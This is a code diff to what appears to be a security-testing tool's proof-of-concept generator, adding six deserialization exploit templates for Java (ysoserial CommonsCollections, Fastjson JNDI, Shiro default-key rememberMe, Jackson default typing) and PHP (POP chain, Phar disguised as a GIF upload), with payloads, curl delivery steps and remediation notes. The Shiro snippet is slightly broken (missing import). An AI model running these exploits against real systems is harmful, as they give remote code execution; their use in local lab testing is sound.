@@ -98,6 +98,7 @@ class PocInstance:
     safe_explanation: str
     reference_cve: str
     mode: str
+    description: str = ""             # 漏洞描述（供测试和报告引用）
     verify_hint: str = ""             # 本地特征验证提示（供 target_validator 用）
 
 
@@ -163,7 +164,13 @@ _REFERENCE_CVES: Dict[str, str] = {
     "debug-mode": "CVE-2019-1010083",
     "csrf-missing": "CVE-2012-5783",
     "sql-format-string": "CVE-2006-2314",
-    "llm-prompt-injection": "OWASP-LLM01",  # AIGC 新型风险，暂无对应经典 CVE
+    "llm-prompt-injection": "OWASP-LLM01",
+    "deser-java-native": "CVE-2015-4852",
+    "deser-java-fastjson": "CVE-2017-18349",
+    "deser-java-shiro": "CVE-2016-4437",
+    "deser-java-jackson": "CVE-2017-7525",
+    "deser-php-pop": "CVE-2018-15133",
+    "deser-php-phar": "CVE-2018-5711",
 }
 
 POC_TEMPLATES: Dict[str, PocTemplate] = {
@@ -522,17 +529,223 @@ POC_TEMPLATES: Dict[str, PocTemplate] = {
             ),
             reference_cve=_REFERENCE_CVES["llm-prompt-injection"],
         ),
+        # ==========================================================
+        # Java Deserialization PoC templates (E1-Fix): gadget chains
+        # ==========================================================
+        PocTemplate(
+            vuln_type="deser-java-native",
+            cwe="CWE-502",
+            payload_template=(
+                "Java 原生反序列化 - ObjectInputStream.readObject() RCE\n"
+                "\n"
+                "步骤 1: 生成 ysoserial gadget payload（CommonsCollections 链）\n"
+                "  java -jar ysoserial.jar CommonsCollections1 'touch /tmp/vuln1_pwned' > /tmp/payload.ser\n"
+                "\n"
+                "步骤 2: Base64 编码\n"
+                "  PAYLOAD=$(base64 -w 0 /tmp/payload.ser)\n"
+                "\n"
+                "步骤 3: 发送 payload（POST body 方式）\n"
+                "  curl -s -X POST '{target_url}/vuln1/deserialize' -d \"$PAYLOAD\"\n"
+                "\n"
+                "步骤 3 (Cookie 方式):\n"
+                "  curl -s -b 'user='\"$PAYLOAD\" '{target_url}/vuln1/cookie'\n"
+                "\n"
+                "前提: Classpath 中存在 commons-collections:commons-collections:3.1 或类似 gadget 依赖\n"
+                "防御: 添加 ObjectInputFilter 白名单校验；避免直接 readObject() 处理不可信数据"
+            ),
+            description="Java 原生反序列化漏洞：通过 ysoserial 构造 CommonsCollections gadget chain 实现 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 仅生成标准的 ysoserial gadget chain 构造命令，目标锁定为本地回环地址。"
+                "不包含实际序列化字节码。"
+                "修复方式：使用 ObjectInputFilter 配置反序列化白名单；"
+                "或替换为 JSON 等安全序列化格式。"
+            ),
+            reference_cve="CVE-2015-4852",
+        ),
+        PocTemplate(
+            vuln_type="deser-java-fastjson",
+            cwe="CWE-502",
+            payload_template=(
+                "Fastjson AutoType 反序列化 - JNDI 注入 RCE\n"
+                "\n"
+                "步骤 1: 构造恶意 JSON（利用 @type 指定危险类）\n"
+                "  PAYLOAD='{{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
+                "\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}}'\n"
+                "\n"
+                "步骤 2: 发送 payload\n"
+                "  curl -s -X POST '{target_url}/vuln2/parse' -H 'Content-Type: application/json' -d \"$PAYLOAD\"\n"
+                "\n"
+                "前提: Fastjson <= 1.2.24 且未关闭 AutoType；可访问恶意 LDAP 服务\n"
+                "防御: 升级 Fastjson 到最新版本；关闭 AutoType；启用 safeMode"
+            ),
+            description="Fastjson AutoType 反序列化：通过 @type 指定危险类实现 JNDI 注入 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 仅描述 Fastjson @type 注入模式，不包含实际恶意 LDAP 服务地址。"
+                "修复方式：升级 Fastjson；配置 ParserConfig.getGlobalInstance().setSafeMode(true)。"
+            ),
+            reference_cve="CVE-2017-18349",
+        ),
+        PocTemplate(
+            vuln_type="deser-java-shiro",
+            cwe="CWE-502",
+            payload_template=(
+                "Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437)\n"
+                "\n"
+                "步骤 1: 生成 ysoserial gadget payload\n"
+                "  java -jar ysoserial.jar CommonsCollections1 'touch /tmp/vuln4_pwned' > /tmp/payload.ser\n"
+                "\n"
+                "步骤 2: AES-CBC 加密（默认密钥 kPH+bIxk5D2deZiIxcaaaA==）\n"
+                "  python3 -c \"\n"
+                "import base64, hmac, hashlib\n"
+                "from Crypto.Cipher import AES\n"
+                "key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')\n"
+                "with open('/tmp/payload.ser','rb') as f: payload = f.read()\n"
+                "iv = os.urandom(16)\n"
+                "cipher = AES.new(key, AES.MODE_CBC, iv)\n"
+                " padded = payload + b'\\x00' * (16 - len(payload)%16)\n"
+                " encrypted = cipher.encrypt(padded)\n"
+                " print(base64.b64encode(iv + encrypted).decode())\n"
+                "\"\n"
+                "\n"
+                "步骤 3: 发送 rememberMe Cookie\n"
+                "  curl -s -b 'rememberMe='\"$ENCRYPTED\" '{target_url}/vuln4/check'\n"
+                "\n"
+                "前提: 默认 AES 密钥未修改；存在 CommonsCollections gadget 依赖\n"
+                "防御: 修改默认密钥为强随机值；升级 Shiro 到 1.2.5+"
+            ),
+            description="Shiro RememberMe 默认密钥反序列化：构造恶意 Cookie 实现 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 仅描述使用已知默认密钥构造 rememberMe cookie 的流程。"
+                "修复方式：生成新 AES 密钥替换默认值；升级 Apache Shiro。"
+            ),
+            reference_cve="CVE-2016-4437",
+        ),
+        PocTemplate(
+            vuln_type="deser-java-jackson",
+            cwe="CWE-502",
+            payload_template=(
+                "Jackson enableDefaultTyping 反序列化 RCE (CVE-2017-7525)\n"
+                "\n"
+                "步骤 1: 构造恶意 JSON（利用多态类型指定危险类）\n"
+                "  PAYLOAD='[\"org.springframework.context.support.ClassPathXmlApplicationContext\","
+                "\"http://127.0.0.1:8000/payload.xml\"]'\n"
+                "\n"
+                "步骤 2: 发送到 Jackson 反序列化端点\n"
+                "  curl -s -X POST '{target_url}/vuln3/deserialize' -H 'Content-Type: application/json' -d \"$PAYLOAD\"\n"
+                "\n"
+                "前提: Jackson enableDefaultTyping() 已启用；存在对应 gadget 类\n"
+                "防御: 移除 enableDefaultTyping() 调用；使用 @JsonTypeInfo 显式声明"
+            ),
+            description="Jackson 多态反序列化：enableDefaultTyping() 允许指定任意类名导致 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 仅描述 Jackson 多态反序列化风险模式。"
+                "修复方式：不使用 enableDefaultTyping()；添加 @JsonTypeInfo 限定允许的类。"
+            ),
+            reference_cve="CVE-2017-7525",
+        ),
+        # ==========================================================
+        # PHP Deserialization PoC templates (E2-Fix): POP chains
+        # ==========================================================
+        PocTemplate(
+            vuln_type="deser-php-pop",
+            cwe="CWE-502",
+            payload_template=(
+                "PHP 反序列化 POP 链 RCE\n"
+                "\n"
+                "步骤 1: 构造 POP chain（Logger.__destruct -> CommandExecutor.__invoke -> system）\n"
+                "  在攻击机执行:\n"
+                "  php -r '\n"
+                "  class CommandExecutor {\n"
+                "    private $command = \"id > /tmp/vuln5_pwned.txt\";\n"
+                "    private $args = [];\n"
+                "    public function __invoke() {\n"
+                "      array_unshift($this->args, $this->command);\n"
+                "      return call_user_func_array(\"system\", $this->args);\n"
+                "    }\n"
+                "  }\n"
+                "  class Logger {\n"
+                "    private $logFile = \"/tmp/log.txt\";\n"
+                "    private $callback;\n"
+                "    public function __construct() {\n"
+                "      $this->callback = new CommandExecutor();\n"
+                "    }\n"
+                "  }\n"
+                "  echo base64_encode(serialize(new Logger()));\n"
+                "  '\n"
+                "\n"
+                "步骤 2: 发送 POP payload\n"
+                "  PAYLOAD=$(php -r '...')\n"
+                "  curl -s -X POST '{target_url}/vuln5.php' --data-urlencode \"data=$PAYLOAD\"\n"
+                "\n"
+                "POP 链: Logger.__destruct() -> CommandExecutor.__invoke() -> system()\n"
+                "前提: 存在 Logger/CommandExecutor 类定义或类似魔术方法链\n"
+                "防御: 使用 json_encode/json_decode 替代 unserialize；对 unserialize 数据加 HMAC 校验"
+            ),
+            description="PHP 反序列化 POP 链：构造魔术方法调用链触发 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 演示 PHP POP 链构造原理，仅使用本地靶场已有类。"
+                "修复方式：避免 unserialize 处理用户输入；使用 json_encode。"
+            ),
+            reference_cve="CVE-2018-15133",
+        ),
+        PocTemplate(
+            vuln_type="deser-php-phar",
+            cwe="CWE-502",
+            payload_template=(
+                "PHP Phar 反序列化 RCE\n"
+                "\n"
+                "步骤 1: 生成恶意 Phar 文件\n"
+                "  php -d phar.readonly=0 -r '\n"
+                "  class CommandExecutor {\n"
+                "    private $command = \"id > /tmp/vuln6_pwned.txt\";\n"
+                "    public function __invoke() { system($this->command); }\n"
+                "  }\n"
+                "  $phar = new Phar(\"/tmp/poc.phar\");\n"
+                "  $phar->startBuffering();\n"
+                "  $phar->addFromString(\"test.txt\", \"test\");\n"
+                "  $phar->setMetadata(new CommandExecutor());\n"
+                "  $phar->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");\n"
+                "  $phar->stopBuffering();\n"
+                "  echo \"Phar created: /tmp/poc.phar\";\n"
+                "  '\n"
+                "\n"
+                "步骤 2: 上传 Phar 文件（伪装为图片）\n"
+                "  curl -s -X POST '{target_url}/vuln6.php' -F 'phar_file=@/tmp/poc.phar;type=image/gif'\n"
+                "\n"
+                "步骤 3: 触发反序列化（Phar 元数据在文件操作时自动反序列化）\n"
+                "  服务端访问 phar:///path/to/upload/poc.phar/test.txt 即触发\n"
+                "\n"
+                "前提: phar.readonly=0；存在文件上传 + Phar 元数据 gadget\n"
+                "防御: 设置 phar.readonly=1；文件操作前检查 Phar 包装器"
+            ),
+            description="PHP Phar 元数据反序列化：伪造图片上传 Phar 文件触发 RCE",
+            local_verify_fn_name="verify_deser_signature",
+            safe_explanation=(
+                "本 PoC 描述 Phar 构造与上传流程，GIF89a 头用于绕过 MIME 检测。"
+                "修复方式：php.ini 设置 phar.readonly=1；禁止 Phar 包装器文件操作。"
+            ),
+            reference_cve="CVE-2018-5711",
+        ),
     ]
 }
 
 
-# 计划表覆盖清单（20 种）
+# 计划表覆盖清单（20+ 种, E1/E2-Fix 扩展 6 种反序列化专项）
 EXPECTED_VULN_TYPES = {
     "sqli-time", "sqli-union", "xss-reflected", "xss-dom", "cmd-injection",
     "ssrf", "path-traversal", "jwt-weak", "deser-pickle", "deser-yaml",
     "xxe", "prototype-pollution", "open-redirect", "idor", "nosql-injection",
     "ssti", "weak-hash", "hardcoded-secret", "debug-mode", "csrf-missing",
     "sql-format-string", "llm-prompt-injection",
+    # E1-Fix: Java 反序列化专项 PoC
+    "deser-java-native", "deser-java-fastjson", "deser-java-shiro", "deser-java-jackson",
+    # E2-Fix: PHP 反序列化专项 PoC
+    "deser-php-pop", "deser-php-phar",
 }
 
 DEFAULT_TARGET = "http://127.0.0.1:8080"
@@ -559,6 +772,13 @@ def _default_payload(vuln_type: str) -> str:
         "sql-format-string": "1' OR '1'='1",
         "open-redirect": "http://127.0.0.1/admin",
         "idor": "2",
+        # 反序列化专项默认 payload（供引用，实际PoC由 payload_template 定义）
+        "deser-java-native": "ysoserial CommonsCollections1 'touch /tmp/pwned'",
+        "deser-java-fastjson": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exp","autoCommit":true}',
+        "deser-java-shiro": "rememberMe=AES(base64(gadget_payload))",
+        "deser-java-jackson": '["org.springframework.context.support.ClassPathXmlApplicationContext","http://127.0.0.1:8000/payload.xml"]',
+        "deser-php-pop": "base64_encode(serialize(new Logger()))",
+        "deser-php-phar": "phar://path/to/upload/poc.phar/test.txt",
     }
     return defaults.get(vuln_type, "fp_sentinel_verify")
 
@@ -618,6 +838,7 @@ def generate_poc(
         safe_explanation=template.safe_explanation,
         reference_cve=template.reference_cve,
         mode=template.mode,
+        description=template.description,
         verify_hint=template.local_verify_fn_name,
     )
 
